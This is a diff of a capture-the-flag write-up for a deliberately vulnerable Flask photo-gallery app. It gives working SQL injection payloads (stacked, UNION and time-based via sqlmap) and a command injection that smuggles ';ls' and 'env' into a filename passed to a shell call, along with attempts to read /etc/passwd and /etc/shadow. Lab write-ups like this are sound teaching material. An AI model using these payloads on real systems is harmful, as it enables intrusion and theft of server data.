@@ -1,5 +1,9 @@
 # Photo Gallery
 
+## About
+
+This CTF challenge involved an input vulnerable to SQLi, which is exploited to the point of shell access on the server.
+
 There are 3 flags to capture from 0-2.
 
 ![Homepage](imgs/1_gallery.jpg "Homepage")
@@ -34,7 +38,7 @@ However, navigating to further ids beyond 1,2,3 e.g. ```fetch?id=4```, ```fetch?
 > Not Found
 > The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.
 
-This is interesting and likely indicates the file at ```id=3``` does exist, but cannot be read for whatever reason, maybe lack of permissions or the id of 3 somehow causes an error on the backend code (probably contains a flag).
+This is interesting and likely indicates the file at ```id=3``` does exist, but cannot be read for whatever reason, maybe lack of permissions or the ```id=3``` somehow causes an error on the backend code (probably contains a flag).
 
 Testing this query further, using letters e.g. ```fetch?id=a```, ```fetch?id=zzz``` yields 500s.
 
@@ -62,7 +66,7 @@ available databases [4]:
 [*] performance_schema
 ```
 
-The DBMS is MySQL and a blind time-based injection vulnerability is found in the ```id=``` parameter, which is leveraged to find the databases. All databases except ```level5``` look standard. So looking further, running ```sqlmap``` with options ```-D level5``` and ```--dump``` finds:
+The DBMS is MySQL and a blind time-based injection vulnerability is found in the ```id=``` parameter, which is exploited by sqlmap to find the databases. All databases except ```level5``` look standard. So looking further, running ```sqlmap``` with options ```-D level5``` and ```--dump``` finds:
 
 ```
 Database: level5
@@ -90,7 +94,7 @@ Table: albums
 
 ## FLAG0
 
-These tables reveal how the SQL query is likely structured. The backend receives an id parameter from ```fetch?id=[]```, which is then used in a ```WHERE``` clause i.e. ```WHERE id=[]```. The filename is likely selected in this query, which is then used to open the file at the filename and return the contents. This explains why ```fetch?id=3``` yielded a 500 error, since there is no file with a name of ```FLAG1``` and therefore failed when trying to open that filename. Also, previously successfully injecting comments indicates that this ```WHERE id=[]``` clause is possibly at the end of the query.
+These tables reveal how the SQL query used is likely structured. The backend receives an id parameter from ```fetch?id=[]```, which is then used in a ```WHERE``` clause i.e. ```WHERE id=[]```. The filename is selected in this query, which is then used to open the file at the filename and return the contents. This explains why ```fetch?id=3``` yielded a 500 error, since there is no file with a name of ```FLAG1``` and therefore failed when trying to open that filename. Also, previously successfully injecting comments indicates that this ```WHERE id=[]``` clause is likely at the end of the query.
 
 Therefore, the query probably looks something like this:
 
@@ -98,7 +102,7 @@ Therefore, the query probably looks something like this:
 SELECT filename FROM photos WHERE id=[]
 ```
 
-This is significant as it is shows the potential of stacked SQL queries i.e. it may be possible to make a query like ```SELECT filename FROM photos WHERE id=%d; INSERT into photos(...) values(...) #```
+This is significant as it also shows the potential of stacked SQL queries i.e. it may be possible to make a query like ```SELECT filename FROM photos WHERE id=%d; INSERT into photos(...) values(...) #```
 
 Testing ```fetch?id=1;INSERT into photos(id,title,parent,filename) values(4,'hello world',1,'files/adorable.jpg')``` and navigating to ```fetch?id=4``` didn't work; 404 is still returned . However, adding the ```COMMIT``` command to the end i.e. ```fetch?id=1;INSERT (...); COMMIT #``` succeeds. Navigating to ```fetch?id=4``` now returns the .jpg text where a 404 was previously returned, proving the existence of a stacked query injection vulnerability.
 
@@ -106,7 +110,7 @@ Trying ```fetch?id=1;UPDATE photos set title='<script>alert(1)</script>' WHERE i
 
 ![Homepage](imgs/2_gallery.jpg "Homepage")
 
-Injecting scripts into images is only possible if access is gained in editing or uploading images. Only filenames in the DB is available. Discovering a stacked query injection is very significant, but what to do with it in terms of this CTF...
+Injecting scripts into images is only possible if access is gained in editing or uploading images. Only filenames in the DB is available. Discovering a stacked query injection is significant, but what to do with it in terms of this CTF...
 
 Getting some hints:
 
@@ -116,13 +120,13 @@ Getting some hints:
 * Take a few minutes to consider the state of the union
 * This application runs on the uwsgi-nginx-flask-docker image
 
-This seems to convey that a ```UNION``` based SQL injection is also possible. It also says that it runs on Docker, Flask, nginx, and uWSGI, which gives some insight as to what files may exist on the server.
+This seems to convey that a ```UNION``` based SQL injection is also possible. It also says that the website runs on Docker, Flask, nginx, and uWSGI, which gives some insight as to what files may exist on the server.
 
 So looking into this, trying ```fetch?id=1 UNION SELECT null``` yielded no errors and returned the same .jpg text, meaning this ```UNION``` injection succeeded.
 
 As found earlier, the full SQL query used looks like ```SELECT filename FROM photos WHERE id=[]```, so it is selecting the filename to be opened and returned. And since it was revealed that the webapp runs on Docker, it is possible that a Dockerfile exists (among other files) and can be exposed with a ```UNION``` injection.
 
-Trying ```fetch?id=1 UNION SELECT 'Dockerfile'``` didn't work. It's likely the case that only the first row in the values returned from the query is being used. E.g. this query returns
+Trying ```fetch?id=1 UNION SELECT 'Dockerfile'``` didn't work. It's possible that only the first row in the values returned from the query is being used. E.g. this query returns
 
 ```
 +---------------------+
@@ -147,7 +151,7 @@ Open ```requirements.txt``` as seen in the Dockerfile via ```fetch?id=9 UNION SE
 
 Nothing special, but confirms that any file any be read with this query.
 
-```tiangolo/uwsgi-nginx-flask:python2.7``` in the Dockerfile looks interesting, and Googling it leads to a Github repo at github.com/tiangolo/uwsgi-nginx-flask. Reading through the repo shows many potential files that likely exist on the server. The main Flask Python script is named as ```main.py``` by this repo.
+```tiangolo/uwsgi-nginx-flask:python2.7``` in the Dockerfile looks interesting, and Googling it leads to a Github repo at github.com/tiangolo/uwsgi-nginx-flask. Reading through the repo shows many potential files that likely exist on the server. The main Flask Python script is always named as ```main.py``` in this repo.
 
 Try to read this Flask script ```main.py``` with the query ```fetch?id=9 UNION SELECT 'main.py'``` successfully returns:
 
@@ -221,7 +225,7 @@ Looking through ```main.py```, some vulnerable non-parameterzied SQL queries are
 rep += '<i>Space used: ' + subprocess.check_output('du -ch %s || exit 0' % ' '.join('files/' + fn for fn in fns), shell=True, stderr=subprocess.STDOUT).strip().rsplit('\n', 1)[-1] + '</i>'
 ```
 
-This vulnerable system call can be exploited via the filenames in the table. For example, changing the filename of the third image to ```;ls``` will change the system call to ```du -ch files/(...) files/(...) ;ls || exit 0;```. ```ls``` is executed and output reflected on the ```Space used: ``` line.
+This vulnerable system call can be exploited via the filenames in the table. For example, changing the filename of the third image to ```;ls``` will change the system call to ```du -ch files/(...) files/(...) files/;ls || exit 0;```. ```ls``` is executed and output reflected on the ```Space used: ``` line.
 
 This is accomplished with the stacked query SQL injection as found earlier: ```fetch?id=1;UPDATE photos set filename=';ls' WHERE id=3; COMMIT #```
 
@@ -239,7 +243,7 @@ Any file on the filesystem can be located via ```;ls | tr "\n" " "``` and printe
 
 Calling ```cat``` on suspicious targets including ```/etc/passwd``` and ```/etc/shadow``` yielded nothing. Going through the hints states: ```Be aware of your environment```
 
-So, try the read the environment variables via ```env``` i.e. ```fetch?id=1;UPDATE photos set filename='env | tr "\n" " "' WHERE id=3; COMMIT #``` which returns:
+So, try reading the environment variables via ```env``` i.e. ```fetch?id=1;UPDATE photos set filename='env | tr "\n" " "' WHERE id=3; COMMIT #``` which returns:
 
 > Space used: PYTHONIOENCODING=UTF-8 UWSGI_ORIGINAL_PROC_NAME=/usr/local/bin/uwsgi SUPERVISOR_GROUP_NAME=uwsgi **FLAGS=["FLAG0", "FLAG1", "FLAG2"]** HOSTNAME=2fe9e014dc2c SHLVL=0 PYTHON_PIP_VERSION=18.1 HOME=/root GPG_KEY=C01E1CAD5EA2C4F0B8E3571504C367C218ADD4FF UWSGI_INI=/app/uwsgi.ini NGINX_MAX_UPLOAD=0 UWSGI_PROCESSES=16 STATIC_URL=/static UWSGI_CHEAPER=2 NGINX_VERSION=1.13.12-1\~stretch PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin NJS_VERSION=1.13.12.0.2.0-1\~stretch LANG=C.UTF-8 SUPERVISOR_ENABLED=1 PYTHON_VERSION=2.7.15 NGINX_WORKER_PROCESSES=1 SUPERVISOR_SERVER_URL=unix:///var/run/supervisor.sock SUPERVISOR_PROCESS_NAME=uwsgi LISTEN_PORT=80 STATIC_INDEX=0 PWD=/app STATIC_PATH=/app/static PYTHONPATH=/app UWSGI_RELOADS=0
 
